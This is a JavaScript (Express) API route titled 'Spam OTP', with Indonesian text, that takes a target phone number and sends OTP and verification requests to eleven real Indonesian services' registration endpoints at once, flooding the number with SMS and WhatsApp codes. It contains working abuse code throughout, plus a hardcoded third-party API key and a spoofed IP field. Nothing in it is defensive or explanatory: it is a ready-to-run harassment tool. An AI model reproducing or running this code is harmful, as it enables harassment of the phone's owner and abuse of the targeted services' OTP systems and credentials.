'use strict';

const axios = require('axios');

module.exports = function register(app, registry) {
  const route = {
    method: 'GET',
    path: '/tools/spamotp',
    group: 'tools',
    name: 'Spam OTP',
    description: 'Kirim spam OTP ke nomor target',
    params: [
      { 
        key: 'phone', 
        required: true, 
        hint: 'Nomor telepon (08xxx atau 628xxx)', 
        example: '6281234567890' 
      }
    ]
  };
  registry.push(route);

  app.get(route.path, async (req, res) => {
    const { phone } = req.query;

    if (!phone || !phone.trim()) {
      return res.status(400).json({
        ok: false,
        error: { 
          code: 'MISSING_PARAM', 
          message: 'Parameter "phone" wajib diisi. Contoh: 6281234567890' 
        }
      });
    }

    const formattedPhone = formatPhone(phone);
    if (!formattedPhone) {
      return res.status(400).json({
        ok: false,
        error: { 
          code: 'INVALID_PHONE', 
          message: 'Format nomor tidak valid. Gunakan 08xxx atau 628xxx' 
        }
      });
    }

    try {
      const p08 = '0' + formattedPhone.slice(2);
      const p62 = formattedPhone;

      const endpoints = buildEndpoints(p08, p62);
      
      const results = await Promise.allSettled(
        endpoints.map(ep => sendRequest(ep))
      );

      const successResults = results
        .map((result, index) => ({ 
          result, 
          index,
          name: endpoints[index].name 
        }))
        .filter(({ result }) => 
          result.status === 'fulfilled' && 
          result.value && 
          result.value.success
        );

      const total = endpoints.length;
      const success = successResults.length;
      const failed = total - success;

      const successList = successResults.map(({ index, name }) => ({
        no: index + 1,
        service: name,
        status: 'success'
      }));

      res.json({
        ok: true,
        result: {
          target: p62,
          total,
          success,
          failed,
          details: successList
        },
        meta: {
          summary: `Successfully sent ${success} OTP to ${p62}`,
          failed_count: failed
        }
      });

    } catch (err) {
      res.status(500).json({
        ok: false,
        error: {
          code: 'INTERNAL_ERROR',
          message: err.message || 'Terjadi kesalahan'
        }
      });
    }
  });
};

function formatPhone(text) {
  let phone = String(text).replace(/[^0-9]/g, '');
  if (!phone || phone.length < 9) return null;
  if (phone.startsWith('0')) phone = '62' + phone.slice(1);
  if (!phone.startsWith('62')) phone = '62' + phone;
  return phone;
}

function buildEndpoints(p08, p62) {
  return [
    {
      name: 'Matahari',
      url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation',
      data: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' }
    },
    {
      name: 'Bonus Belanja',
      url: 'https://www.bonusbelanja.com/api/auth/registration/app',
      data: { phone: p62, name: 'user', agreeTnc: true, agreeContact: false }
    },
    {
      name: 'Alodokter',
      url: 'https://www.alodokter.com/resend-otp',
      data: {
        user: { phone: p08, uuid: 'f6bd0911-888f-4b3d-b189-2edf0e8e5e4e' },
        request_via: 'whatsapp'
      }
    },
    {
      name: 'Dokterin',
      url: 'https://api.dokterin.id/user/v1/users/login',
      data: { phone: p62, tnc_accept: true }
    },
    {
      name: 'Fastwork',
      url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode',
      data: { phone_number: p08 }
    },
    {
      name: 'Paper.id',
      url: 'https://register.paper.id/api/v1/auth/register/send-otp',
      data: { phone: p62, method: 'whatsapp', registered_by: 'web' }
    },
    {
      name: 'Pinhome',
      url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
      data: {
        accountType: 'customers',
        applicationType: 'Pinhome Web',
        countryCode: '62',
        medium: 'whatsapp',
        otpType: 'register',
        phoneNumber: p62.replace('62', '')
      }
    },
    {
      name: 'Beautyhaul',
      url: 'https://www.beautyhaul.com/ajax/account/send_otp',
      data: { method: 'WhatsApp', phone: p62 }
    },
    {
      name: 'Bliblitiket',
      url: 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
      data: {
        action: 'REGISTER_OTP',
        channel: 'WHATS_APP',
        recipient: p62,
        recaptchaToken: ''
      }
    },
    {
      name: 'Rumah123',
      url: 'https://www.rumah123.com/api/otp/request-otp',
      data: {
        ipAddress: '36.67.110.51',
        phoneNumber: p62,
        portalId: 1,
        type: 'WHATSAPP',
        url: 'https://www.rumah123.com/user/login'
      },
      headers: { 'Base-Url-Core': 'https://www.rumah123.com' }
    },
    {
      name: 'Saturdays',
      url: 'https://beta.api.saturdays.com/api/v1/user/otp/send',
      data: {
        number: p62.replace('62', ''),
        country_code: '+62',
        type: ''
      },
      headers: {
        'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj',
        'country-code': 'ID'
      }
    }
  ];
}

async function sendRequest(endpoint) {
  const config = {
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
      ...(endpoint.headers || {})
    },
    timeout: 10000
  };

  try {
    const response = await axios.post(endpoint.url, endpoint.data, config);
    
    if (response.status === 200 || response.status === 201) {
      return { success: true, status: response.status };
    }
    return { success: false, status: response.status };
  } catch (error) {
    return { success: false, status: error.response?.status || 0 };
  }
}